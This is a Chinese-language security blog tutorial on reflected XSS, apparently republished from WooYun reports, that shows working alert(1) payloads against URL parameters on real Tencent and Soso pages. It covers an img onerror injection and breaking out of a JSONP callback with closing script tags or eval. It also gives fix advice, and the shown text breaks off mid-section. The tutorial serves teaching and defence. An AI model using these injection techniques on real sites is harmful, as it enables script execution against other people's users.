<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>那些年我们一起学XSS - B0urne &#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="theme-color" content="red"><meta name="application-name" content="B0urne &#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.jpg"><meta name="msapplication-TileColor" content="red"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="B0urne &#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="1. 什么都没过滤的入门情况"><meta property="og:type" content="blog"><meta property="og:title" content="那些年我们一起学XSS"><meta property="og:url" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/"><meta property="og:site_name" content="B0urne &#039;s Blog"><meta property="og:description" content="1. 什么都没过滤的入门情况"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_001.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_002.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_003.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_004.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_005.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/image-20191016195922102.png"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_007.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_008.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_009.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_010.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_011.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_012.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_013.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_014.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_015.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_016.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_017.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_018.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_019.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_020.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_021.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_022.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_023.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_024.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_025.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_026.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_027.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_028.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_029.jpg"><meta property="og:image" content="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_030.jpg"><meta property="article:published_time" content="2019-10-16T11:50:01.000Z"><meta property="article:modified_time" content="2020-07-27T13:39:06.000Z"><meta property="article:author" content="B0urne"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_001.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/"},"headline":"B0urne 's Blog","image":["http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_001.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_002.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_003.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_004.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_005.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/image-20191016195922102.png","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_007.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_008.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_009.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_010.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_011.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_012.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_013.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_014.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_015.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_016.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_017.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_018.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_019.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_020.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_021.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_022.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_023.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_024.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_025.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_026.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_027.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_028.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_029.jpg","http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_030.jpg"],"datePublished":"2019-10-16T11:50:01.000Z","dateModified":"2020-07-27T13:39:06.000Z","author":{"@type":"Person","name":"B0urne"},"description":"1. 什么都没过滤的入门情况"}</script><link rel="canonical" href="http://b0u4ne.gihub.io/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/"><link rel="icon" href="/img/favicon.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><script data-ad-client="11" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js" async></script><meta name="generator" content="Hexo 5.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo2.png" alt="B0urne &#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2019-10-16T11:50:01.000Z" title="2019-10-16 19:50:01">2019-10-16</time>发表</span><span class="level-item"><time dateTime="2020-07-27T13:39:06.000Z" title="2020-7-27 21:39:06">2020-07-27</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/XSS/">XSS</a></span><span class="level-item">39 分钟读完 (大约5799个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">那些年我们一起学XSS</h1><div class="content"><h1 id="1-什么都没过滤的入门情况"><a href="#1-什么都没过滤的入门情况" class="headerlink" title="1. 什么都没过滤的入门情况"></a>1. 什么都没过滤的入门情况</h1><a id="more"></a>

<p>来源：<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-015957">1. 什么都没过滤的入门情况</a></p>
<h2 id="简要描述"><a href="#简要描述" class="headerlink" title="简要描述"></a>简要描述</h2><p>只是些反射型 XSS，单单发出来没有什么意义。 只是些反射型 XSS，腾讯怎么修都修不完。 只是些反射型 XSS，我想让它变得更有价值。 只是些反射型 XSS，我拿他们做成了教程。</p>
<h2 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h2><ol>
<li><p>XSS 的存在，一定是伴随着输入，与输出 2 个概念的。</p>
</li>
<li><p>要想过滤掉 XSS，你可以在输入层面过滤，也可以在输出层面过滤。</p>
</li>
<li><p>如果输入和输出都没过滤。 那么漏洞将是显而易见的。</p>
</li>
<li><p>作为第一个最基础的例子，</p>
</li>
</ol>
<p>我们拿出的是一个什么都没过滤（其实还是有些转义的，主要没过滤<code>&lt;</code> , <code>&gt;</code>）的例子。</p>
<p>这种例子出现在 腾讯这种大网站的概率不是很高。 但是还是让我找到了一个。</p>
<p>5.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;app.data.qq.com&#x2F;?umod&#x3D;commentsoutlet&amp;act&#x3D;count&amp;siteid&#x3D;3&amp;libid&#x3D;9&amp;dataid&#x3D;1480&amp;score&#x3D;1&amp;func&#x3D;haoping&amp;_&#x3D;1353475261886</span><br></pre></td></tr></table></figure>
<ol start="6">
<li>对于上面这个例子。我们可以看到什么是输入，什么是输出。</li>
</ol>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_001.jpg" alt="image"></p>
<ol start="7">
<li>经过测试，我们发现，score 这个【输入】参数，没有进行任何过滤，即，输入是什么，输出就是什么？ 通俗点就是“吃什么，拉什么”。。。 如下图：</li>
</ol>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_002.jpg" alt="image"></p>
<p>网页中看到的效果如下：</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_003.jpg" alt="image"></p>
<p>\8. 既然可以直接输入 <code>&lt;</code> <code>&gt;</code> HTML 标签，接下来的利用也就相对简单了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;app.data.qq.com&#x2F;?umod&#x3D;commentsoutlet&amp;act&#x3D;count&amp;siteid&#x3D;3&amp;libid&#x3D;9&amp;dataid&#x3D;1480&amp;score&#x3D;&lt;img src&#x3D;1 onerror&#x3D;alert(1);&gt;&amp;func&#x3D;haoping&amp;_&#x3D;1353475261886</span><br></pre></td></tr></table></figure>
<p>效果如下：</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_004.jpg" alt="image"></p>
<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML 标签&gt;&lt;&#x2F;HTML 标签&gt;</span><br><span class="line">[输出]</span><br><span class="line">&lt;HTML 标签&gt;&lt;&#x2F;HTML 标签&gt;</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML 标签&gt;[输出]&lt;&#x2F;HTML 标签&gt;</span><br></pre></td></tr></table></figure>
<p>a. 通常，我们只需要在输出前，将 <code>&lt;</code> , <code>&gt;</code> 过滤掉即可。</p>
<p>b. 这类 XSS 在小型网站中比较常见，在大型网站中少见。</p>
<p>c. 这类 XSS 通常都被浏览器的 XSS 过滤器秒杀了，所以一般来说，威力较小。</p>
<p>d. 对于普通用户来说，请使用 IE8 及以上版本（并开启 XSS 过滤器功能，默认开启），或 chrome 浏览器，将可以防御大部分此种类型 的 XSS 攻击</p>
<h1 id="2-输出在-之间的情况"><a href="#2-输出在-之间的情况" class="headerlink" title="2. 输出在``之间的情况"></a>2. 输出在``之间的情况</h1><blockquote>
<p><a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-015959">2. 输出在``之间的情况</a></p>
</blockquote>
<h2 id="简要描述-1"><a href="#简要描述-1" class="headerlink" title="简要描述"></a>简要描述</h2><p>接着上面一个教程，我们继续。这个例子属于第一例的特殊情况，当然也有特殊解法。也属于非常常见的一种情况。</p>
<h2 id="详细说明-1"><a href="#详细说明-1" class="headerlink" title="详细说明"></a>详细说明</h2><ol>
<li>我们找到这么一个点，也是输入和输出都未过滤的一个点。相比教程第一例，其特殊之处在于，是输出在了 <code>[输出]</code> 之间。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;activity.soso.com&#x2F;common&#x2F;setParentsInfo.php?callback&#x3D;aaaaaaaaa</span><br></pre></td></tr></table></figure>
<p>如下图：callback 参数未做过滤。 在【查看源代码】下，我们可以看到。</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_005.jpg" alt="image"></p>
<p>缺陷网页源代码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;document.domain&#x3D;&#39;soso.com&#39;;_ret&#x3D;&#123;&quot;_res&quot;:2&#125;;try&#123;parent.aaa(_ret);&#125;catch(err)&#123;aaa(_ret);&#125;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>碰到这种情况，我们一般有以下解法。</li>
</ol>
<p>2.1 首先判断，是否过滤了 <code>&lt;</code> , <code>&gt;</code> , <code>/</code> 等符号，</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/image-20191016195922102.png" alt="image-20191016195922102"></p>
<p>2.2 如果都没有过滤，恭喜你，一般可以直接 XSS 了。代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;activity.soso.com&#x2F;common&#x2F;setParentsInfo.php?callback&#x3D;aaaaaaaaa&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaaaa&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>原理入下图：</p>
<p>构造 callback 参数后的源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;document.domain&#x3D;&#39;soso.com&#39;;_ret&#x3D;&#123;&quot;_res&quot;:2&#125;;try&#123;parent.aaaaaaaaa&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;(_ret);&#125;catch(err)&#123;aaaaaaaaa&lt;&#x2F;script&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;(_ret);&#125;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>2.3 如果过滤了 <code>&lt;</code>, <code>&gt;</code>，那么就无法使用上面的办法了。我们接着看</p>
<ol start="3">
<li>script 代码里的构造。</li>
</ol>
<p>友情提示：这里可能需要一点点 javascript 的知识才行哦～～ 我们可以如下构造：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;activity.soso.com&#x2F;common&#x2F;setParentsInfo.php?callback&#x3D;eval(&#39;alert(1)&#39;);void</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#39;alert(1)&#39;);void</span><br></pre></td></tr></table></figure>
<p>可以看到，源代码是下面的样子。</p>
<p><img src="/2019/10/16/web%E6%B8%97%E9%80%8F/%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/Image_007.jpg" alt="image"></p>
<p>也就是说，我们插入的内容，使得这一段 javascript 依然【语法正确】，能够【正确执行】，并且能够执行【我们所插入的 JS 代码】，</p>
<p>这样我们的目的就达到了。 构造后的源代码如下：</p>
